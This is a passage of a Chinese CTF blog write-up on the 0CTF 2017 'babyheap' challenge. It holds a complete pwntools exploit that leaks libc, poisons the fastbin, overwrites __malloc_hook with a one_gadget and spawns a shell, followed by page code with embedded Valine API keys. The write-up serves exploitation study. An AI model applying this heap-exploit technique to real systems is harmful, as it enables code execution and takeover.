  <span class="token punctuation">[</span>rsp+0x50<span class="token punctuation">]</span> <span class="token operator">==</span> NULL

0xf1147 execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x70, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x70<span class="token punctuation">]</span> <span class="token operator">==</span> NULL
</code></pre>
<p>利用Fill函数向多次申请后申请到的fake_chunk写入onegadget</p>
<p>因为距离malloc_hook 0x23 所以填充数据 溢出覆盖malloc_hook</p>
<p>再次申请堆块时 会调用malloc_hook </p>
<p>成功getshell</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span> 

p <span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./babyheap_0ctf_2017'</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#p =remote('pwn.buuoj.cn',20001)</span>
<span class="token comment" spellcheck="true">#libc=ELF('x64_libc.so.6')</span>
<span class="token keyword">def</span> <span class="token function">Allocate</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">Fill</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>con<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>con<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>con<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">Free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">Dump</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: \n'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=0</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=1</span>
<span class="token comment" spellcheck="true">#sleep(1)</span>
Fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=2</span>
Fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=2</span>
Fill<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>
Free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
<span class="token keyword">print</span> Dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#print hexDump(1)[:-8]</span>
leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>Dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x58</span>
<span class="token keyword">print</span> <span class="token string">"leak:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#gdb.attach(p)</span>

base<span class="token operator">=</span>leak<span class="token number">-0x3c4b20</span>
malloc_hook<span class="token operator">=</span>base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span>
Free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
Fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx</span>
Fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base<span class="token operator">+</span><span class="token number">0x4526a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx4</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>


  

  
    <div class="post-reward">
      <div id="reward-button">请杯咖啡呗~</div>
      <div id="qr">
        <div class="wrap">
            
            <div class="bg-wrap">
              <a href="/images/zhifubao.png" target="_block" class="bg" style="background-image:url('/images/zhifubao.png')"></a>
              支付宝
            </div>
            
            
            <div class="bg-wrap">
                <a href="/images/weixin.png" target="_block" class="bg" style="background-image:url('/images/weixin.png')"></a>
              微信
            </div>
            
        </div>
      </div>
    </div>
  
  
  <div class="post-guide">
    <div class="item left">
        
          <a href="2020/02/23/buuctf-Writeup/"><span class="iconfont icon-left"></span>buuctf-Writeup</a>
        
    </div>
    <div class="item right">
        
          <a href="2019/07/25/wasm逆向-真的是web/">wasm逆向-真的是web<span class="iconfont icon-right"></span></a>
        
    </div>
  </div>

  

  <div class="post-copyright">
    <div class="auth">
      本文作者：<a href="http://iosmosis.github.io">ios</a>
    </div>
    <div class="link">
      永久链接：<a href="http://iosmosis.github.io/2019/09/13/babyheap-0ctf-2017/">http://iosmosis.github.io/2019/09/13/babyheap-0ctf-2017/</a>
    </div>
    <div class="declare">
      版权声明：本文首发于<a href="http://iosmosis.github.io">ios</a>的博客，转载请注明出处！
    </div>
  </div>

  <div id="comment"></div>
</article>
        </div>
        <footer>
          <div class="copyright">
            ©2019 <a href="http://iosmosis.github.io">ios</a>. Powered by
            <a href="https://hexo.io">Hexo</a> &
            <a href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
          </div>
          
        </footer>
      </div>
      <div id="card-wrap">
        <div class="card">
          <div class="logo-widget">
            <div class="author">
              ios
            </div>
            <div class="logo" style="background-image: url('/images/logo.jpeg')"></div>
          </div>
          
          <div class="follow-widget">
            
            <a href="https://github.com/iosmosis" target="_block">
              <span class="iconfont icon-github"></span>
            </a>
            
            <a href="2417117320" target="_block">
              <span class="iconfont icon-QQ"></span>
            </a>
             
            <a href="/atom.xml" target="_block">
              <span class="iconfont icon-rss"></span>
            </a>
            
          </div>
          <div class="category-widget">
            <div class="title">
              <span>Category</span>
            </div>
            <div class="list">
              
            </div>
          </div>
          <div class="tag-widget">
            <div class="title">
              <span>Tag cloud</span>
            </div>
            <div class="tag-cloud">
              <a href="/tags/ios逆向-越狱/" style="font-size: 14px; color: #4a4a4a">-ios逆向 -越狱</a> <a href="/tags/AI外挂/" style="font-size: 14px; color: #4a4a4a">AI外挂</a> <a href="/tags/About-Me/" style="font-size: 14px; color: #4a4a4a">About Me</a> <a href="/tags/BUPT/" style="font-size: 14px; color: #4a4a4a">BUPT</a> <a href="/tags/CTFwiki/" style="font-size: 14px; color: #4a4a4a">CTFwiki</a> <a href="/tags/Fastbin-Attack/" style="font-size: 16px; color: #4a4a4a">Fastbin_Attack</a> <a href="/tags/Getshell/" style="font-size: 14px; color: #4a4a4a">Getshell</a> <a href="/tags/Heap/" style="font-size: 16px; color: #4a4a4a">Heap</a> <a href="/tags/Hexo/" style="font-size: 14px; color: #4a4a4a">Hexo</a> <a href="/tags/Jarvis-OJ/" style="font-size: 14px; color: #4a4a4a">Jarvis OJ</a> <a href="/tags/MISC/" style="font-size: 14px; color: #4a4a4a">MISC</a> <a href="/tags/NPUCTF/" style="font-size: 14px; color: #4a4a4a">NPUCTF</a> <a href="/tags/Pwn/" style="font-size: 20px; color: #4a4a4a">Pwn</a> <a href="/tags/RE/" style="font-size: 18px; color: #4a4a4a">RE</a> <a href="/tags/ROP/" style="font-size: 14px; color: #4a4a4a">ROP</a>
            </div>
          </div>
           
          <div class="toc-widget">
            <div class="title">
              <span>Toc</span>
            </div>
            <div class="post-toc">
              <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-text">checksec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Leak-Libc-base"><span class="toc-text">Leak Libc_base</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#过程"><span class="toc-text">过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取libc-base"><span class="toc-text">获取libc base</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastbin-Attack"><span class="toc-text">Fastbin Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li></ol>
            </div>
          </div>
           
        </div>
        
      </div>
    </div>
    <!-- swiftype -->
    
    <!-- swiftype -->
  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
  
  <p id="theme_str" hidden>{&quot;title&quot;:&quot;ios&#39;s blog&quot;,&quot;subtitle&quot;:null,&quot;description&quot;:null,&quot;author&quot;:&quot;ios&quot;,&quot;language&quot;:&quot;zh-CN&quot;,&quot;timezone&quot;:null,&quot;url&quot;:&quot;http://iosmosis.github.io&quot;,&quot;root&quot;:&quot;/&quot;,&quot;permalink&quot;:&quot;:year/:month/:day/:title/&quot;,&quot;permalink_defaults&quot;:null,&quot;source_dir&quot;:&quot;source&quot;,&quot;public_dir&quot;:&quot;public&quot;,&quot;tag_dir&quot;:&quot;tags&quot;,&quot;archive_dir&quot;:&quot;archives&quot;,&quot;category_dir&quot;:&quot;categories&quot;,&quot;code_dir&quot;:&quot;downloads/code&quot;,&quot;i18n_dir&quot;:&quot;:lang&quot;,&quot;skip_render&quot;:null,&quot;new_post_name&quot;:&quot;:title.md&quot;,&quot;default_layout&quot;:&quot;post&quot;,&quot;titlecase&quot;:false,&quot;external_link&quot;:true,&quot;filename_case&quot;:0,&quot;render_drafts&quot;:false,&quot;post_asset_folder&quot;:true,&quot;relative_link&quot;:false,&quot;future&quot;:true,&quot;highlight&quot;:{&quot;enable&quot;:false,&quot;auto_detect&quot;:false,&quot;line_number&quot;:true,&quot;tab_replace&quot;:null},&quot;default_category&quot;:&quot;uncategorized&quot;,&quot;category_map&quot;:null,&quot;tag_map&quot;:null,&quot;date_format&quot;:&quot;YYYY-MM-DD&quot;,&quot;time_format&quot;:&quot;HH:mm:ss&quot;,&quot;per_page&quot;:10,&quot;pagination_dir&quot;:&quot;page&quot;,&quot;theme&quot;:&quot;huhu&quot;,&quot;deploy&quot;:{&quot;type&quot;:&quot;git&quot;,&quot;repository&quot;:&quot;git@github.com:iosmosis/iosmosis.github.io.git&quot;,&quot;branch&quot;:&quot;master&quot;,&quot;message&quot;:&quot;Site updated at {{ now(\&quot;YYYY-MM-DD HH:mm:ss\&quot;) }}&quot;},&quot;ignore&quot;:[],&quot;hljs&quot;:{&quot;enable&quot;:true,&quot;line_number&quot;:&quot;frontend&quot;,&quot;trim_indent&quot;:&quot;backend&quot;,&quot;copy_code&quot;:false},&quot;live2d&quot;:{&quot;enable&quot;:true,&quot;scriptFrom&quot;:&quot;local&quot;,&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;use&quot;:&quot;live2d-widget-model-koharu&quot;},&quot;display&quot;:{&quot;position&quot;:&quot;right&quot;,&quot;width&quot;:150,&quot;height&quot;:300},&quot;mobile&quot;:{&quot;show&quot;:true}},&quot;prism_plugin&quot;:{&quot;mode&quot;:&quot;preprocess&quot;,&quot;theme&quot;:&quot;ghcolors&quot;,&quot;line_number&quot;:false,&quot;custom_css&quot;:&quot;path/to/your/custom.css&quot;},&quot;jsonContent&quot;:{&quot;meta&quot;:false,&quot;pages&quot;:false,&quot;posts&quot;:{&quot;title&quot;:true,&quot;date&quot;:true,&quot;path&quot;:true,&quot;text&quot;:true,&quot;raw&quot;:false,&quot;content&quot;:false,&quot;slug&quot;:false,&quot;updated&quot;:false,&quot;comments&quot;:false,&quot;link&quot;:false,&quot;permalink&quot;:false,&quot;excerpt&quot;:false,&quot;categories&quot;:false,&quot;tags&quot;:true}},&quot;category_generator&quot;:{&quot;per_page&quot;:10},&quot;archive_generator&quot;:{&quot;per_page&quot;:10,&quot;yearly&quot;:true,&quot;monthly&quot;:true,&quot;daily&quot;:false},&quot;baidusitemap&quot;:{&quot;path&quot;:&quot;baidusitemap.xml&quot;},&quot;feed&quot;:{&quot;type&quot;:&quot;atom&quot;,&quot;limit&quot;:20,&quot;hub&quot;:&quot;&quot;,&quot;content&quot;:true,&quot;path&quot;:&quot;atom.xml&quot;},&quot;sitemap&quot;:{&quot;path&quot;:&quot;sitemap.xml&quot;},&quot;index_generator&quot;:{&quot;per_page&quot;:10,&quot;order_by&quot;:&quot;-date&quot;},&quot;tag_generator&quot;:{&quot;per_page&quot;:10},&quot;marked&quot;:{&quot;gfm&quot;:true,&quot;pedantic&quot;:false,&quot;sanitize&quot;:false,&quot;tables&quot;:true,&quot;breaks&quot;:true,&quot;smartLists&quot;:true,&quot;smartypants&quot;:true},&quot;server&quot;:{&quot;port&quot;:4000,&quot;log&quot;:false,&quot;ip&quot;:&quot;0.0.0.0&quot;,&quot;compress&quot;:false,&quot;header&quot;:true},&quot;menu&quot;:{&quot;home&quot;:&quot;/&quot;,&quot;archives&quot;:&quot;/archives&quot;,&quot;about&quot;:&quot;/about&quot;,&quot;Link&quot;:&quot;/link&quot;},&quot;logo&quot;:&quot;/images/logo.png&quot;,&quot;categories_max&quot;:5,&quot;tags_max&quot;:10,&quot;site_search&quot;:true,&quot;rss&quot;:&quot;/atom.xml&quot;,&quot;follow&quot;:{&quot;github&quot;:&quot;https://github.com/iosmosis&quot;,&quot;QQ&quot;:&quot;2417117320&quot;},&quot;search_url&quot;:&quot;/search.xml&quot;,&quot;site_icp&quot;:&quot;&quot;,&quot;site_friends&quot;:{&quot;房间里的小猫咪&quot;:&quot;http://baidu.com&quot;},&quot;share&quot;:[&quot;weibo&quot;,&quot;weixin&quot;,&quot;qqkongjian&quot;,&quot;QQ&quot;,&quot;douban&quot;,&quot;facebook&quot;,&quot;twitter&quot;,&quot;google&quot;],&quot;cdn_module&quot;:{&quot;av_min&quot;:&quot;https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min&quot;,&quot;pjax&quot;:&quot;https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min&quot;,&quot;jquery&quot;:&quot;https://cdn.bootcss.com/jquery/3.4.1/jquery.min&quot;,&quot;confirm&quot;:&quot;https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min&quot;,&quot;fancybox&quot;:&quot;https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min&quot;,&quot;algoliasearch&quot;:&quot;https://cdn.jsdelivr.net/npm/algoliasearch@3.33.0/dist/algoliasearchLite.min&quot;},&quot;baidu_push&quot;:true,&quot;reward&quot;:{&quot;weixin&quot;:&quot;images/weixin.png&quot;,&quot;zhifubao&quot;:&quot;images/zhifubao.png&quot;},&quot;service_worker&quot;:{&quot;open&quot;:false},&quot;valine&quot;:{&quot;API_ID&quot;:&quot;7Y7XlmC1rYmaNjqc4nP11H33-gzGzoHsz&quot;,&quot;API_KEY&quot;:&quot;CohJO6tVqg9R4yI5v5AqKEc7&quot;}}</p>
</html>
<script type="text/javascript">
  window.addEventListener('load', function() {
    ;(adsbygoogle = window.adsbygoogle || []).push({
      google_ad_client: 'undefined',
      enable_page_level_ads: true
    })

    window.THEME_CONFIG = JSON.parse(document.getElementById('theme_str').innerText)
    window.loadJs = function(d, m, a) {
      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
      var b = document.createElement('script')
      b.defer = true
      b.setAttribute('type', 'text/javascript')
      b.setAttribute('charset', 'UTF-8')
      b.setAttribute('async', 'true')
      b.setAttribute('src', d)
      m && b.setAttribute('data-main', '/scripts/app')
      if (typeof a === 'function') {
        if (window.attachEvent) {
          b.onreadystatechange = function() {
            var e = b.readyState
            if (e === 'loaded' || e === 'complete') {
              b.onreadystatechange = null
              a()
            }
          }
        } else {
          b.onload = a
        }
      }
      c.appendChild(b)
    }
    window.loadJs &&
      window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {
        require.config({
          paths: {
            // site
            util: 'util',
            share: 'share',
            search: 'search',
            iconfont: 'iconfont',
            registerSW: 'registerSW',
            valine: ['cdn/Valine.min'],

            // cdn
            av: ['https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min', 'cdn/av-min'],
            pjax: ['https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min', 'cdn/pjax.min'],
            jquery: ['https://cdn.bootcss.com/jquery/3.4.1/jquery.min', 'cdn/jquery.min'],
            confirm: ['https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min', 'cdn/jquery.confirm.min'],
            fancybox: ['https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min', 'cdn/jquery.fancybox.min'],
            algoliasearch: ['https://cdn.jsdelivr.net/npm/algoliasearch@3.33.0/dist/algoliasearchLite.min', 'cdn/algoliasearchLite.min']
          },

          map: {
            '*': {
              css: 'https://cdn.bootcss.com/require-css/0.1.10/css.min.js'
            }
          },

          shim: {
            fancybox: {
              deps: ['css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css']
            },
            confirm: {
              deps: ['css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css']
            }
          },

          // 加载超时
          waitSeconds: 3
        })
      })
  })
</script>

<script>
  ;(function() {
    var bp = document.createElement('script')
    var curProtocol = window.location.protocol.split(':')[0]
    if (curProtocol === 'https') {
      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
    } else {
      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
    }
    var s = document.getElementsByTagName('script')[0]
    s.parentNode.insertBefore(bp, s)
  })()
</script>

<script src="https://cdn.jsdelivr.net/npm/algoliasearch@3.33.0/dist/algoliasearchLite.min.js"></script>
<script></script>
